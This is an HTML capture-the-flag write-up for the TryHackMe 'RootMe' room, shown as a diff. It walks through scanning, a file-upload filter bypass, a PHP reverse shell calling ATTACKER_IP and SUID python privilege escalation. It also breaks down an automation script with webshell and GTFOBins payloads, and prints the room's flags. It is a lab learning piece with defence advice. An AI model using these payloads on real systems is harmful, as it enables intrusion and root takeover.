@@ -1,0 +1,919 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RootMe CTF Writeup | 0xb0rn3</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --bg: #1d2021;
+            --bg-soft: #282828;
+            --fg: #ebdbb2;
+            --red: #fb4934;
+            --green: #b8bb26;
+            --yellow: #fabd2f;
+            --blue: #83a598;
+            --purple: #d3869b;
+            --aqua: #8ec07c;
+            --orange: #fe8019;
+            --gray: #928374;
+        }
+
+        body {
+            font-family: 'JetBrains Mono', 'Courier New', monospace;
+            background: var(--bg);
+            color: var(--fg);
+            line-height: 1.8;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+        }
+
+        header {
+            background: var(--bg-soft);
+            border: 4px solid var(--red);
+            padding: 40px;
+            margin-bottom: 40px;
+        }
+
+        .back-link {
+            display: inline-block;
+            color: var(--aqua);
+            text-decoration: none;
+            margin-bottom: 20px;
+            font-weight: bold;
+            transition: all 0.2s;
+        }
+
+        .back-link:hover {
+            color: var(--yellow);
+            transform: translateX(-4px);
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            color: var(--red);
+            margin-bottom: 15px;
+            text-transform: uppercase;
+        }
+
+        .meta {
+            display: flex;
+            gap: 20px;
+            flex-wrap: wrap;
+            margin-top: 20px;
+            color: var(--gray);
+        }
+
+        .meta-item {
+            padding: 8px 16px;
+            background: var(--bg);
+            border: 2px solid var(--gray);
+        }
+
+        .platform-badge {
+            background: var(--green);
+            color: var(--bg);
+            border-color: var(--green);
+            font-weight: bold;
+        }
+
+        .difficulty-badge {
+            background: var(--yellow);
+            color: var(--bg);
+            border-color: var(--yellow);
+            font-weight: bold;
+        }
+
+        article {
+            background: var(--bg-soft);
+            border: 3px solid var(--green);
+            padding: 40px;
+            margin-bottom: 40px;
+        }
+
+        h2 {
+            color: var(--yellow);
+            font-size: 1.8rem;
+            margin-top: 40px;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 3px solid var(--yellow);
+        }
+
+        h3 {
+            color: var(--blue);
+            font-size: 1.4rem;
+            margin-top: 30px;
+            margin-bottom: 15px;
+        }
+
+        p {
+            margin-bottom: 15px;
+        }
+
+        ul, ol {
+            margin-left: 30px;
+            margin-bottom: 20px;
+        }
+
+        li {
+            margin-bottom: 8px;
+        }
+
+        code {
+            background: var(--bg);
+            color: var(--orange);
+            padding: 2px 6px;
+            border: 1px solid var(--gray);
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        pre {
+            background: var(--bg);
+            border: 3px solid var(--purple);
+            padding: 20px;
+            overflow-x: auto;
+            margin: 20px 0;
+        }
+
+        pre code {
+            background: none;
+            border: none;
+            color: var(--fg);
+            padding: 0;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+            background: var(--bg);
+        }
+
+        th {
+            background: var(--purple);
+            color: var(--bg);
+            padding: 12px;
+            text-align: left;
+            border: 2px solid var(--purple);
+            font-weight: bold;
+        }
+
+        td {
+            padding: 10px 12px;
+            border: 2px solid var(--gray);
+        }
+
+        tr:nth-child(even) {
+            background: var(--bg-soft);
+        }
+
+        blockquote {
+            border-left: 4px solid var(--aqua);
+            background: var(--bg);
+            padding: 15px 20px;
+            margin: 20px 0;
+            color: var(--aqua);
+            font-weight: bold;
+        }
+
+        .flag {
+            background: var(--red);
+            color: var(--fg);
+            padding: 15px;
+            margin: 20px 0;
+            border: 3px solid var(--red);
+            font-weight: bold;
+            text-align: center;
+            font-size: 1.1rem;
+        }
+
+        .attack-chain {
+            background: var(--bg);
+            border: 3px solid var(--green);
+            padding: 30px;
+            margin: 30px 0;
+            font-family: monospace;
+            white-space: pre;
+            overflow-x: auto;
+            line-height: 2;
+        }
+
+        .highlight-box {
+            background: var(--bg);
+            border: 3px solid var(--orange);
+            padding: 20px;
+            margin: 20px 0;
+        }
+
+        .highlight-box h4 {
+            color: var(--orange);
+            margin-bottom: 10px;
+        }
+
+        footer {
+            text-align: center;
+            padding: 30px;
+            background: var(--bg-soft);
+            border: 3px solid var(--gray);
+        }
+
+        footer a {
+            color: var(--aqua);
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        footer a:hover {
+            color: var(--yellow);
+        }
+
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 1.8rem;
+            }
+
+            article {
+                padding: 20px;
+            }
+
+            pre {
+                font-size: 0.85rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <a href="CTF.html" class="back-link">← Back to CTF Writeups</a>
+            <h1>RootMe - TryHackMe CTF</h1>
+            <div class="meta">
+                <span class="meta-item platform-badge">TryHackMe</span>
+                <span class="meta-item difficulty-badge">Easy</span>
+                <span class="meta-item">Date: February 16, 2026</span>
+                <span class="meta-item">Author: 0xb0rn3 | 0xbv1</span>
+            </div>
+        </header>
+
+        <article>
+            <h2>Overview</h2>
+            <p>RootMe is a beginner-friendly CTF challenge that tests fundamental web exploitation and Linux privilege escalation skills. The attack chain involves:</p>
+            <ol>
+                <li>Reconnaissance and service enumeration</li>
+                <li>Web directory brute-forcing</li>
+                <li>File upload filter bypass to gain a reverse shell</li>
+                <li>SUID binary abuse for privilege escalation</li>
+            </ol>
+
+            <div class="highlight-box" style="border-color: var(--green); margin-top: 30px;">
+                <h4 style="color: var(--green);">🤖 Automation Available</h4>
+                <p>I've created a full automation script (<code>rootmeautopwn</code>) that performs the entire exploitation chain automatically. The script is available in my <a href="https://github.com/0xb0rn3/CTFS/tree/main/THM/rootmeCTF" target="_blank" style="color: var(--aqua);">CTFS GitHub repository</a>.</p>
+                <p style="margin-top: 10px;"><strong>Skip to:</strong> <a href="#automation-script" style="color: var(--yellow);">Automation Script Breakdown</a> to see how it works, or continue reading for the manual walkthrough.</p>
+            </div>
+
+            <h3>📑 Table of Contents</h3>
+            <ul style="margin-bottom: 30px;">
+                <li><strong>Manual Exploitation:</strong>
+                    <ul>
+                        <li><a href="#phase1" style="color: var(--aqua);">Phase 1: Reconnaissance</a></li>
+                        <li><a href="#phase2" style="color: var(--aqua);">Phase 2: Directory Enumeration</a></li>
+                        <li><a href="#phase3" style="color: var(--aqua);">Phase 3: File Upload Bypass</a></li>
+                        <li><a href="#phase4" style="color: var(--aqua);">Phase 4: Privilege Escalation</a></li>
+                    </ul>
+                </li>
+                <li><strong>Automation:</strong>
+                    <ul>
+                        <li><a href="#automation-script" style="color: var(--yellow);">🤖 Script Breakdown & Tutorial</a></li>
+                    </ul>
+                </li>
+                <li><strong>Analysis:</strong>
+                    <ul>
+                        <li><a href="#lessons" style="color: var(--purple);">Lessons Learned & Defense</a></li>
+                    </ul>
+                </li>
+            </ul>
+
+            <h2 id="phase1">Phase 1: Reconnaissance</h2>
+
+            <h3>Port Scanning & Service Detection</h3>
+            <pre><code>nmap -sV -sC -p 80,443,8080 10.49.170.219</code></pre>
+
+            <p><strong>Results:</strong></p>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Port</th>
+                        <th>State</th>
+                        <th>Service</th>
+                        <th>Version</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>80</td>
+                        <td>open</td>
+                        <td>http</td>
+                        <td>Apache httpd 2.4.41 (Ubuntu)</td>
+                    </tr>
+                    <tr>
+                        <td>443</td>
+                        <td>closed</td>
+                        <td>https</td>
+                        <td>-</td>
+                    </tr>
+                    <tr>
+                        <td>8080</td>
+                        <td>closed</td>
+                        <td>http-proxy</td>
+                        <td>-</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <div class="highlight-box">
+                <h4>Key Findings:</h4>
+                <ul>
+                    <li><strong>Apache Version:</strong> 2.4.41 (Ubuntu)</li>
+                    <li>PHP is running (PHPSESSID cookie detected)</li>
+                    <li>Site title: "HackIT - Home" with prompt "Can you root me?"</li>
+                </ul>
+            </div>
+
+            <h3>HTTP Header Confirmation</h3>
+            <pre><code>curl -sI http://10.49.170.219/</code></pre>
+
+            <pre><code>HTTP/1.1 200 OK
+Server: Apache/2.4.41 (Ubuntu)
+Set-Cookie: PHPSESSID=...; path=/
+Content-Type: text/html; charset=UTF-8</code></pre>
+
+            <blockquote>
+                <strong>Answer:</strong> The Apache version running is <strong>2.4.41</strong>
+            </blockquote>
+
+            <h2 id="phase2">Phase 2: Directory Enumeration</h2>
+
+            <h3>Gobuster Scan</h3>
+            <pre><code>gobuster dir -u http://10.49.170.219/ \
+  -w /usr/share/dirb/wordlists/common.txt \
+  -t 10 --timeout 60s</code></pre>
+
+            <p><strong>Results:</strong></p>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Path</th>
+                        <th>Status</th>
+                        <th>Description</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>/index.php</td>
+                        <td>200</td>
+                        <td>Main page</td>
+                    </tr>
+                    <tr>
+                        <td>/css</td>
+                        <td>301</td>
+                        <td>Stylesheet directory</td>
+                    </tr>
+                    <tr>
+                        <td>/js</td>
+                        <td>301</td>
+                        <td>JavaScript directory</td>
+                    </tr>
+                    <tr style="background: rgba(251, 73, 52, 0.1);">
+                        <td><strong>/panel</strong></td>
+                        <td>301</td>
+                        <td><strong>Upload panel (hidden directory!)</strong></td>
+                    </tr>
+                    <tr>
+                        <td>/uploads</td>
+                        <td>301</td>
+                        <td>Uploaded files directory</td>
+                    </tr>
+                    <tr>
+                        <td>/server-status</td>
+                        <td>403</td>
+                        <td>Forbidden</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <blockquote>
+                <strong>Answer:</strong> The hidden directory is <strong>/panel/</strong>
+            </blockquote>
+
+            <h2 id="phase3">Phase 3: Exploitation - File Upload Bypass</h2>
+
+            <h3>Discovering the Upload Form</h3>
+            <p>Navigating to <code>http://10.49.170.219/panel/</code> reveals a file upload form:</p>
+            <pre><code>&lt;form action="" method="POST" enctype="multipart/form-data"&gt;
+    &lt;input type="file" name="fileUpload" class="fileUpload"&gt;
+    &lt;input type="submit" value="Upload" name="submit"&gt;
+&lt;/form&gt;</code></pre>
+
+            <h3>Testing the Filter</h3>
+            <p>Attempting to upload a <code>.php</code> file returns:</p>
+            <pre><code>PHP não é permitido!</code></pre>
+            <p><em>Translation: "PHP is not allowed!" - The server blocks <code>.php</code> extensions.</em></p>
+
+            <h3>Bypass Strategy</h3>
+            <p>The filter only checks for the <code>.php</code> extension. Alternative PHP extensions that Apache will still execute:</p>
+            <ul>
+                <li><code>.php5</code> (used successfully) ✅</li>
+                <li><code>.phtml</code></li>
+                <li><code>.php3</code>, <code>.php4</code></li>
+                <li><code>.phps</code></li>
+            </ul>
+
+            <h3>Crafting the Reverse Shell</h3>
+            <p>Created a PHP reverse shell saved as <code>shell.php5</code>:</p>
+            <pre><code>&lt;?php
+set_time_limit(0);
+$ip = 'ATTACKER_IP';
+$port = 4444;
+$shell = 'uname -a; w; id; /bin/bash -i';
+
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+$descriptorspec = array(
+   0 => array("pipe", "r"),
+   1 => array("pipe", "w"),
+   2 => array("pipe", "w")
+);
+$process = proc_open($shell, $descriptorspec, $pipes);
+// ... (full reverse shell code)
+?&gt;</code></pre>
+
+            <h3>Upload & Execution</h3>
+            <pre><code># Upload the shell
+curl -X POST -F "<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="7c1a151019290c10131d18413c0f14191010520c140c49">[email&#160;protected]</a>" \
+  -F "submit=Upload" http://10.49.170.219/panel/
+# Response: "O arquivo foi upado com sucesso!" 
+# (The file was uploaded successfully!)
+
+# Start listener
+nc -lvnp 4444
+
+# Trigger the shell
+curl http://10.49.170.219/uploads/shell.php5</code></pre>
+
+            <p><strong>Result:</strong> Reverse shell received as <code>www-data</code></p>
+
+            <h3>User Flag</h3>
+            <pre><code>cat /var/www/user.txt</code></pre>
+
+            <div class="flag">
+                🚩 USER FLAG: THM{y0u_g0t_a_sh3ll}
+            </div>
+
+            <h2 id="phase4">Phase 4: Privilege Escalation</h2>
+
+            <h3>SUID Binary Enumeration</h3>
+            <pre><code>find / -perm -4000 -type f 2>/dev/null</code></pre>
+
+            <p><strong>SUID binaries found:</strong></p>
+            <pre><code>/usr/bin/newuidmap
+/usr/bin/newgidmap
+/usr/bin/chsh
+/usr/bin/python2.7    <-- UNUSUAL!
+/usr/bin/at
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/pkexec</code></pre>
+
+            <blockquote>
+                <strong>Answer:</strong> The weird SUID file is <strong>/usr/bin/python2.7</strong>
+            </blockquote>
+
+            <div class="highlight-box">
+                <h4>Why is python2.7 SUID Dangerous?</h4>
+                <p>Python with the SUID bit set allows any user to execute Python code with root privileges. This is a critical misconfiguration because Python can directly manipulate process UIDs via the <code>os</code> module.</p>
+                <p><strong>Reference:</strong> <a href="https://gtfobins.github.io/gtfobins/python/#suid" target="_blank" style="color: var(--aqua);">GTFOBins - Python SUID</a></p>
+            </div>
+
+            <h3>Exploitation</h3>
+            <pre><code>python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'</code></pre>
+
+            <p>This:</p>
+            <ol>
+                <li><code>os.setuid(0)</code> - Sets the effective user ID to root (UID 0), which works because the SUID bit makes the process run with the file owner's (root's) privileges</li>
+                <li><code>os.system("/bin/bash")</code> - Spawns a root shell</li>
+            </ol>
+
+            <h3>Verification</h3>
+            <pre><code>id
+# uid=0(root) gid=33(www-data) groups=33(www-data)</code></pre>
+
+            <h3>Root Flag</h3>
+            <pre><code>cat /root/root.txt</code></pre>
+
+            <div class="flag">
+                🚩 ROOT FLAG: THM{pr1v1l3g3_3sc4l4t10n}
+            </div>
+
+            <h2>Attack Chain Summary</h2>
+
+            <div class="highlight-box" style="border-color: var(--orange);">
+                <h4 style="color: var(--orange);">⏱️ Manual vs Automated</h4>
+                <table style="margin-top: 10px;">
+                    <thead>
+                        <tr>
+                            <th>Method</th>
+                            <th>Time</th>
+                            <th>Commands</th>
+                            <th>Best For</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><strong>Manual</strong></td>
+                            <td>~15-30 min</td>
+                            <td>20+ commands</td>
+                            <td>Learning, understanding the attack flow</td>
+                        </tr>
+                        <tr style="background: rgba(184, 187, 38, 0.1);">
+                            <td><strong>Automated</strong></td>
+                            <td>~2-5 min</td>
+                            <td>1 command</td>
+                            <td>Speed, repeatability, portfolio demonstration</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+
+            <div class="attack-chain">Reconnaissance          Directory Enum          Upload Bypass
+     |                       |                       |
+  nmap -sV              gobuster dir           shell.php5
+  Apache 2.4.41         /panel/ found          filter bypassed
+     |                       |                       |
+     +--------+--------------+-----------+-----------+
+              |                          |
+         Web Shell / Reverse Shell    www-data access
+              |                          |
+         find SUID binaries          python2.7 found
+              |                          |
+         os.setuid(0)               ROOT ACCESS
+              |                          |
+         cat /root/root.txt         THM{pr1v1l3g3_3sc4l4t10n}</div>
+
+            <h2>Flags Captured</h2>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Flag</th>
+                        <th>Location</th>
+                        <th>Value</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>user.txt</td>
+                        <td>/var/www/user.txt</td>
+                        <td>THM{y0u_g0t_a_sh3ll}</td>
+                    </tr>
+                    <tr>
+                        <td>root.txt</td>
+                        <td>/root/root.txt</td>
+                        <td>THM{pr1v1l3g3_3sc4l4t10n}</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h2 id="automation-script">🤖 Automation Script Breakdown</h2>
+
+            <p>For efficiency and repeatability, I automated the entire RootMe exploitation chain into a single bash script. This section breaks down how the automation works — perfect for beginners who want to understand the connection between manual exploitation steps and scripting.</p>
+
+            <div class="highlight-box">
+                <h4>Why Automate CTFs?</h4>
+                <ul>
+                    <li><strong>Learning:</strong> Writing automation forces you to understand the exploit chain deeply</li>
+                    <li><strong>Speed:</strong> Re-pwn the box in seconds if the instance resets</li>
+                    <li><strong>Portfolio:</strong> Demonstrates scripting and automation skills to employers</li>
+                    <li><strong>Practice:</strong> Build tools that work across similar challenges</li>
+                </ul>
+            </div>
+
+            <h3>How the Script Works</h3>
+
+            <p>The <code>rootmeautopwn</code> script mirrors the manual exploitation process but runs end-to-end without human intervention. Here's the flow:</p>
+
+            <div class="attack-chain">Phase 1: Dependencies Check
+    ↓
+Phase 2: Interactive Configuration (target IP, listener IP, port)
+    ↓
+Phase 3: Reconnaissance (nmap scan, Apache version detection)
+    ↓
+Phase 4: Directory Enumeration (gobuster → /panel/, /uploads/)
+    ↓
+Phase 5: Upload Bypass (.php5, .phtml, .php4 iteration)
+    ↓
+Phase 6: Webshell Verification (GET ?cmd=echo+EXEC_OK)
+    ↓
+Phase 7: Flag Retrieval (find user.txt, enumerate SUID)
+    ↓
+Phase 8: Privilege Escalation (python/perl/find SUID exploit)
+    ↓
+Phase 9: Root Flag (cat /root/root.txt)
+    ↓
+Mission Report Generated</div>
+
+            <h3>Script Architecture</h3>
+
+            <p><strong>Download:</strong> <a href="https://github.com/0xb0rn3/CTFS/blob/main/THM/rootmeCTF/rootmeautopwn" target="_blank" style="color: var(--aqua);">rootmeautopwn on GitHub</a></p>
+
+            <p>The script is organized into discrete phases that can fail gracefully. If directory enumeration doesn't find <code>/panel/</code>, the script tries a manual <code>curl</code> check before giving up. If all upload extensions fail, it reports the failure and stops.</p>
+
+            <h3>Key Functions Explained</h3>
+
+            <h4>1. Dependency Auto-Installation</h4>
+            <pre><code>check_deps() {
+    local missing=()
+    for tool in nmap gobuster curl nc; do
+        if ! command -v "$tool" &>/dev/null; then
+            missing+=("$tool")
+        fi
+    done
+    
+    if [ ${#missing[@]} -ne 0 ]; then
+        if [ -f /etc/arch-release ]; then
+            sudo pacman -S --noconfirm "${missing[@]}"
+        elif [ -f /etc/debian_version ]; then
+            sudo apt-get install -y "${missing[@]}"
+        fi
+    fi
+}</code></pre>
+
+            <p><strong>What it does:</strong> Checks if nmap, gobuster, curl, and nc are installed. If any are missing, automatically installs them using the system's package manager (pacman for Arch, apt for Debian/Ubuntu).</p>
+
+            <p><strong>Why it matters:</strong> Eliminates the "command not found" errors. The script becomes portable — run it on any Arch or Debian system and it self-configures.</p>
+
+            <h4>2. Network Interface Auto-Detection</h4>
+            <pre><code>get_config() {
+    # Auto-detect LHOST from tun0 (VPN), fallback to default route
+    LHOST=$(ip addr show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
+    if [ -z "$LHOST" ]; then
+        LHOST=$(ip route get 1.1.1.1 2>/dev/null | awk '{print $7; exit}')
+    fi
+    
+    echo -e "${CYN}[*] Detected LHOST: $LHOST${NC}"
+    echo -e "${YEL}[?] Use this IP for reverse shell? (y/n):${NC}"
+    read -rp ">> " confirm
+}</code></pre>
+
+            <p><strong>What it does:</strong> Automatically detects your VPN IP from the <code>tun0</code> interface (TryHackMe OpenVPN creates this). If no VPN is connected, falls back to your default route IP.</p>
+
+            <p><strong>Why it matters:</strong> You don't need to manually look up your IP with <code>ifconfig</code> or <code>ip a</code>. The script figures it out, then asks for confirmation — so you can override if needed.</p>
+
+            <h4>3. Upload Filter Bypass Loop</h4>
+            <pre><code>phase_exploit() {
+    local extensions=("php5" "phtml" "php4" "php3" "phps")
+    
+    for ext in "${extensions[@]}"; do
+        local test_name="test_$(head -c 4 /dev/urandom | xxd -p).$ext"
+        local response=$(curl -s -X POST \
+            -F "fileUpload=@$webshell;filename=$test_name" \
+            -F "submit=Upload" \
+            "http://$TARGET/panel/")
+        
+        if echo "$response" | grep -qi "sucesso\|success"; then
+            # Verify code execution
+            local exec_test=$(curl -s "http://$TARGET/uploads/$test_name?cmd=echo+EXEC_OK")
+            if echo "$exec_test" | grep -q "EXEC_OK"; then
+                echo "[+] Code execution confirmed!"
+                break
+            fi
+        fi
+    done
+}</code></pre>
+
+            <p><strong>What it does:</strong> Iterates through 5 different PHP extensions (<code>.php5</code>, <code>.phtml</code>, etc.) until one bypasses the upload filter. After each successful upload, it immediately tests code execution with <code>?cmd=echo+EXEC_OK</code>.</p>
+
+            <p><strong>Why it matters:</strong> No manual trial-and-error. The script tests all known bypass techniques and stops at the first working one. If <code>.php5</code> works, it never tries <code>.phtml</code>.</p>
+
+            <p><strong>Randomization:</strong> Notice <code>test_$(head -c 4 /dev/urandom | xxd -p).$ext</code> — this generates a random filename like <code>test_a3f8b2c1.php5</code> to avoid collisions if you run the script multiple times.</p>
+
+            <h4>4. SUID Auto-Exploitation</h4>
+            <pre><code>phase_flags() {
+    local suid_list=$(exec_cmd "find /usr/bin -perm -4000 -type f 2>/dev/null")
+    local weird_suid=$(echo "$suid_list" | grep -E "python|perl|ruby" | head -1)
+    
+    if echo "$weird_suid" | grep -q "python"; then
+        root_flag=$(exec_cmd "$weird_suid -c 'import os;os.setuid(0);os.system(\"cat /root/root.txt\")'")
+    elif echo "$weird_suid" | grep -q "perl"; then
+        root_flag=$(exec_cmd "$weird_suid -e 'use POSIX;setuid(0);exec(\"cat /root/root.txt\")'")
+    elif echo "$weird_suid" | grep -q "find"; then
+        root_flag=$(exec_cmd "$weird_suid /root/root.txt -exec cat {} \\;")
+    fi
+}</code></pre>
+
+            <p><strong>What it does:</strong> Finds SUID binaries with <code>find / -perm -4000</code>, filters for exploitable ones (python, perl, find, vim, env), then automatically runs the appropriate GTFOBins payload to read <code>/root/root.txt</code>.</p>
+
+            <p><strong>Why it matters:</strong> Once you have a webshell, the script handles the privilege escalation path automatically. It doesn't just find python SUID — it immediately exploits it using the correct syntax.</p>
+
+            <h4>5. Webshell Command Executor</h4>
+            <pre><code>exec_cmd() {
+    local cmd="$1"
+    local encoded_cmd=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$cmd'))")
+    curl -s "$SHELL_URL?cmd=$encoded_cmd"
+}</code></pre>
+
+            <p><strong>What it does:</strong> Wraps every shell command in proper URL encoding and sends it to the webshell. For example, <code>exec_cmd "cat /etc/passwd"</code> becomes <code>GET /uploads/shell.php5?cmd=cat%20%2Fetc%2Fpasswd</code>.</p>
+
+            <p><strong>Why it matters:</strong> Commands with spaces, special characters, or quotes need URL encoding to work in GET parameters. This function abstracts that complexity so the rest of the script can call commands naturally.</p>
+
+            <h3>Running the Script</h3>
+
+            <pre><code># Clone the repo
+git clone https://github.com/0xb0rn3/CTFS.git
+cd CTFS/THM/rootmeCTF
+
+# Make executable
+chmod +x rootmeautopwn
+
+# Run
+./rootmeautopwn</code></pre>
+
+            <p><strong>Interactive prompts:</strong></p>
+            <pre><code>[?] Enter target IP:
+>> 10.10.x.x
+
+[*] Detected LHOST: 10.8.x.x
+[?] Use this IP for reverse shell? (y/n):
+>> y
+
+[?] Listener port (default 4444):
+>> 
+
+[!] Ready to pwn 10.10.x.x. Proceed? (y/n):
+>> y</code></pre>
+
+            <h3>Output Artifacts</h3>
+
+            <p>Everything is saved to a timestamped directory <code>rootme_pwn_YYYYMMDD_HHMMSS/</code>:</p>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>File</th>
+                        <th>Contents</th>
+                        <th>Use Case</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>nmap_scan.txt</td>
+                        <td>nmap greppable output</td>
+                        <td>Reference scan results later</td>
+                    </tr>
+                    <tr>
+                        <td>gobuster_results.txt</td>
+                        <td>Directory enumeration</td>
+                        <td>Verify all discovered paths</td>
+                    </tr>
+                    <tr>
+                        <td>suid_binaries.txt</td>
+                        <td>Full SUID binary list</td>
+                        <td>Audit for other privesc paths</td>
+                    </tr>
+                    <tr>
+                        <td>webshell_url.txt</td>
+                        <td>Active webshell URL</td>
+                        <td>Manual interaction if needed</td>
+                    </tr>
+                    <tr>
+                        <td>flags.txt</td>
+                        <td>Both user.txt and root.txt</td>
+                        <td>Submit to TryHackMe</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>Learning from the Automation</h3>
+
+            <div class="highlight-box" style="border-color: var(--blue);">
+                <h4 style="color: var(--blue);">Beginner Tips</h4>
+                <ul>
+                    <li><strong>Don't just run it blind:</strong> Read through the script first, understand what each phase does</li>
+                    <li><strong>Compare to manual steps:</strong> Notice how <code>phase_exploit()</code> mirrors the manual upload bypass process</li>
+                    <li><strong>Experiment:</strong> Modify the script to add more upload extensions, try different SUID payloads</li>
+                    <li><strong>Debug mode:</strong> Add <code>set -x</code> at the top to see every command executed</li>
+                    <li><strong>Adapt it:</strong> Use this as a template for other TryHackMe rooms with similar attack chains</li>
+                </ul>
+            </div>
+
+            <h3>Common Issues & Fixes</h3>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Error</th>
+                        <th>Cause</th>
+                        <th>Fix</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>"No wordlist found"</td>
+                        <td>SecLists not installed</td>
+                        <td>Script auto-generates minimal wordlist</td>
+                    </tr>
+                    <tr>
+                        <td>"LHOST detection failed"</td>
+                        <td>VPN not connected</td>
+                        <td>Connect to TryHackMe VPN first</td>
+                    </tr>
+                    <tr>
+                        <td>"All upload bypass failed"</td>
+                        <td>Room config changed or wrong target</td>
+                        <td>Verify target IP, check /panel/ manually</td>
+                    </tr>
+                    <tr>
+                        <td>"SUID not found"</td>
+                        <td>Script only checks /usr/bin</td>
+                        <td>Expand search to /bin /usr/local/bin</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h2 id="lessons">Lessons Learned</h2>
+
+            <ol>
+                <li><strong>Never rely on extension-based file upload filtering alone.</strong> Blacklisting <code>.php</code> is easily bypassed with alternative extensions (<code>.php5</code>, <code>.phtml</code>). Use allowlisting and validate file content/MIME types instead.</li>
+
+                <li><strong>SUID binaries should be audited regularly.</strong> Tools like <code>find / -perm -4000</code> reveal dangerous misconfigurations. Python, perl, and other interpreters should never have SUID set.</li>
+
+                <li><strong>Principle of least privilege matters.</strong> The web server running as <code>www-data</code> with access to upload directories combined with SUID python created a direct path from anonymous web access to root.</li>
+
+                <li><strong>Defense recommendations:</strong>
+                    <ul>
+                        <li>Implement allowlist-based upload filtering (only allow specific safe extensions like <code>.jpg</code>, <code>.png</code>)</li>
+                        <li>Validate file content with magic bytes, not just extensions</li>
+                        <li>Remove SUID bit from interpreters: <code>chmod u-s /usr/bin/python2.7</code></li>
+                        <li>Use AppArmor/SELinux to restrict web server capabilities</li>
+                        <li>Store uploads outside the webroot or disable PHP execution in upload directories</li>
+                    </ul>
+                </li>
+            </ol>
+
+            <h2>Tools Used</h2>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Tool</th>
+                        <th>Purpose</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>nmap</td>
+                        <td>Port scanning & service detection</td>
+                    </tr>
+                    <tr>
+                        <td>gobuster</td>
+                        <td>Directory brute-forcing</td>
+                    </tr>
+                    <tr>
+                        <td>curl</td>
+                        <td>HTTP requests & file upload</td>
+                    </tr>
+                    <tr>
+                        <td>nc</td>
+                        <td>Reverse shell listener</td>
+                    </tr>
+                    <tr>
+                        <td>python2.7</td>
+                        <td>SUID privilege escalation</td>
+                    </tr>
+                    <tr style="background: rgba(184, 187, 38, 0.1);">
+                        <td><strong>rootmeautopwn</strong></td>
+                        <td><strong>Full automation script (all phases)</strong></td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <div class="highlight-box" style="border-color: var(--green); margin-top: 30px;">
+                <h4 style="color: var(--green);">📦 Script Repository</h4>
+                <p>The automation script and other CTF tools are available in my <a href="https://github.com/0xb0rn3/CTFS" target="_blank" style="color: var(--aqua); font-weight: bold;">CTFS GitHub repository</a>.</p>
+                <p style="margin-top: 10px;">Contributions and improvements welcome!</p>
+            </div>
+        </article>
+
+        <footer>
+            <p>© 2026 <a href="main.html">0xb0rn3</a> | CTF Writeups & Security Research</p>
+            <p style="margin-top: 10px;">
